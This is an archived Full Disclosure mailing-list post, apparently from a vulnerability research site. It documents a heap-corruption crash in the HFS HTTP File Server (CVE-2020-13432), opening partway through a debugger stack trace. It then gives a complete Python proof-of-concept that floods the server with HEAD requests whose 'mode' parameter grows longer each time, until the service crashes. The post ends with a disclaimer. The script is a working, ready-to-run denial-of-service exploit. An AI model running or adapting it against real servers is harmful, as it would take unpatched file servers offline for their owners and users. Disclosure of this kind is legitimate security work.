000a7424 0051150d 042e76d0 000a75c4 00511ebc hfs+0x89a3c
000a7430 00511ebc 000a761c 000a75d0 00512089 hfs+0x11150d
000a75c4 00512255 000a761c 000a75dc 00512281 hfs+0x111ebc
000a761c 00516989 00000000 00000001 ffffffff hfs+0x112255
000a7838 0051c787 000a7878 043b3510 000a78c8 hfs+0x116989
000a78bc 0051cf7a 000a7910 000a792c 0051d41c hfs+0x11c787
000a7910 004eda33 066f4b20 000a7924 004ef995 hfs+0x11cf7a
000a791c 004ef995 000a796c 004eee5e 000a7974 hfs+0xeda33
000a7924 004eee5e 000a7974 004ef0c2 000a796c hfs+0xef995
000a796c 004ef20c 000a79a4 004ef222 000a798c hfs+0xeee5e
000a798c 004c7c16 0671e960 0671e960 000a79dc hfs+0xef20c
000a799c 004c9680 000a7a1c 004c9cdb 000a79dc hfs+0xc7c16
000a79dc 004ca581 00000401 000a7ee8 0671e901 hfs+0xc9680
000a7a14 004c4727 000a7e58 004c47d2 000a7e40 hfs+0xca581
000a7e40 004c4873 000a7ee8 0671e960 000a7e98 hfs+0xc4727
000a7e50 004c4b61 000a7ea0 004c4beb 000a7e98 hfs+0xc4873
000a7e98 004c364e 000a8008 004c36e5 000a7ebc hfs+0xc4b61
000a7ebc 004ca0e0 00000401 009901d0 0671e960 hfs+0xc364e
000a7ed4 004c3784 004c3730 009901d0 00000000 hfs+0xca0e0
000a7ef8 76eee0bb 009901d0 00000401 00000384 hfs+0xc3784
000a7f24 76ef8849 004c3730 009901d0 00000401
user32!_InternalCallWinProc+0x2b
000a7f48 76efb145 00000401 00000384 00000001 user32!InternalCallWinProc+0x20
000a8018 76ee90dc 004c3730 00000000 00000401
user32!UserCallWinProcCheckWow+0x1be
000a8084 76ee38c0 000a80a8 00489a13 000a80b0
user32!DispatchMessageWorker+0x4ac
000a808c 00489a13 000a80b0 0437c990 01000001 user32!DispatchMessageA+0x10
000a80a8 00489a3c 009901d0 00000401 00000384 hfs+0x89a13
000a80d0 0051150d 042e7400 000a8270 00511ebc hfs+0x89a3c
000a80dc 00511ebc 000a82c8 000a827c 00512089 hfs+0x11150d
000a8270 00512255 000a82c8 000a8288 00512281 hfs+0x111ebc
000a82c8 00516989 00000000 00000001 ffffffff hfs+0x112255
000a84e4 0051c787 000a8524 043b3510 000a8574 hfs+0x116989
000a8568 0051cf7a 000a85bc 000a85d8 0051d41c hfs+0x11c787
000a85bc 004eda33 066f48a0 000a85d0 004ef995 hfs+0x11cf7a
000a85c8 004ef995 000a8618 004eee5e 000a8620 hfs+0xeda33
000a85d0 004eee5e 000a8620 004ef0c2 000a8618 hfs+0xef995
000a8618 004ef20c 000a8650 004ef222 000a8638 hfs+0xeee5e
000a8638 004c7c16 0671d430 0671d430 000a8688 hfs+0xef20c
000a8648 004c9680 000a86c8 004c9cdb 000a8688 hfs+0xc7c16
000a8688 004ca581 00000401 000a8b94 0671d401 hfs+0xc9680
000a86c0 004c4727 000a8b04 004c47d2 000a8aec hfs+0xca581
000a8aec 004c4873 000a8b94 0671d430 000a8b44 hfs+0xc4727
000a8afc 004c4b61 000a8b4c 004c4beb 000a8b44 hfs+0xc4873
000a8b44 004c364e 000a8cb4 004c36e5 000a8b68 hfs+0xc4b61
000a8b68 004ca0e0 00000401 00c60898 0671d430 hfs+0xc364e
000a8b80 004c3784 004c3730 00c60898 00000000 hfs+0xca0e0
000a8ba4 76eee0bb 00c60898 00000401 00000384 hfs+0xc3784
000a8bd0 76ef8849 004c3730 00c60898 00000401
user32!_InternalCallWinProc+0x2b
000a8bf4 76efb145 00000401 00000384 00000001 user32!InternalCallWinProc+0x20
000a8cc4 76ee90dc 004c3730 00000000 00000401
user32!UserCallWinProcCheckWow+0x1be
000a8d30 76ee38c0 000a8d54 00489a13 000a8d5c
user32!DispatchMessageWorker+0x4ac
000a8d38 00489a13 000a8d5c 0437c990 01000001 user32!DispatchMessage

SYMBOL_NAME:  heap_corruption!heap_corruption

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: heap_corruption

IMAGE_NAME:  heap_corruption

DEBUG_FLR_IMAGE_TIMESTAMP:  0

STACK_COMMAND:  dt ntdll!LdrpLastDllInitializer BaseDllName ; dt
ntdll!LdrpFailureData ; ~0s; .ecxr ; kb

FAILURE_BUCKET_ID:  HEAP_CORRUPTION_c0000005_heap_corruption!heap_corruption

BUCKET_ID:

APPLICATION_FAULT_HEAP_CORRUPTION_INVALID_STACK_ACCESS_INVALID_POINTER_WRITE_EXPLOITABLE_heap_corruption!heap_corruption

Exploit/PoC:
from socket import *
import time,sys

#HFS HTTP File Server v2.2a build 124 - 2.3m build 300.
#Vendor: www.rejetto.com
#UPDATED CVE-2020-13432 exploit for v2.2a on 4/2/2021
#Heap Corruption - Buffer Overflow Dos
#Note: hfs.exe must have at least one saved virtual file or folder on the
target
#test using a remote IP and not from the same machine.
#Discovery: hyp3rlinx
#hyp3rlinx.altervista.org
#ISR: ApparitionSec
#=========================================================================
res=""
once=0
cnt=0
max_requests=666

def hfs_dos():

    global ip,port,length,res,once,cnt,max_requests

    cnt+=1

    length += 1
    payload = "A"*length

    try:
        s=socket(AF_INET, SOCK_STREAM)
        s.settimeout(2)
        s.connect((ip,port))
        ##bof ="HEAD / HTTP/1.1\r\nHost: "+ip+"Cookie: "+payload+"\r\n\r\n"
        bof ="HEAD /?mode="+payload+" HTTP/1.1\r\nHost: "+ip+"\r\n\r\n"
        s.send(bof.encode("utf-8"))
        if once==0:
            once+=1
            res = s.recv(128)
            if res != "":
                print("Targets up please wait...\n")
                if "HFS 2.3m" not in str(res) and "HFS 2.2a" not in
str(res):
                    print("[!] Non vulnerable HFS version, exiting :(")
                    exit()
                else:
                    print(res)
    except Exception as e:
        if e != None:
            if str(e).find("timed out")!=-1:
                if res=="":
                    print("[!] Target is not up or behind a firewall? :(")
                    exit()
                else:
                    print("[!] Done!")
                    exit()
    s.close()

    if cnt == max_requests:
        return False
    return True

def msg():
    print("CVE-2020-13432 HFS HTTP File Server v2.2a build 124 - 2.3m build
300.")
    print("Unauthenticated Remote Buffer Overflow (DoS - PoC) updated
4/2/2021")
    print("Virtual HFS saved file or folder required.")
    print("Run from a different machine (IP) than the target.")
    print("By Hyp3rlinx - ApparitionSec\n")

if __name__=="__main__":

    length=3

    if len(sys.argv) != 3:
        msg()
        print("Usage: <hfs.exe Server>, <Port (usually 8080)>")
        exit()

    ip = sys.argv[1]
    port = int(sys.argv[2])

    msg()

    while True:
        if not hfs_dos():
            print("[!] Failed, non vuln version or no virtual files exist
on the target server :(")
            break

Disclaimer: The information contained within this advisory is supplied
"as-is" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory,
provided that it is not altered except by reformatting it, and that due
credit is given. Permission is explicitly given for insertion in
vulnerability databases and similar, provided that due credit is given to
the author. The author is not responsible for any misuse of the information
contained herein and accepts no responsibility for any damage caused by the
use or misuse of this information. The author prohibits any malicious use
of security related information or exploits by the author or elsewhere. Do
not attempt to download Malware samples. The author of this website takes
no responsibility for any kind of damages occurring from improper Malware
handling or the downloading of ANY Malware mentioned on this website or
elsewhere. All content Copyright (c) Malvuln.com (TM).

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](11)
[By Date](date.html#12)
[![Next](/images/right-icon-16x16.png)](13)

[![Previous](/images/left-icon-16x16.png)](11)
[By Thread](index.html#12)
[![Next](/images/right-icon-16x16.png)](13)

### Current thread:

* **Trojan.Win32.Sharer.h / Known Vulnerable Component - Heap Corruption** *malvuln (Apr 06)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")


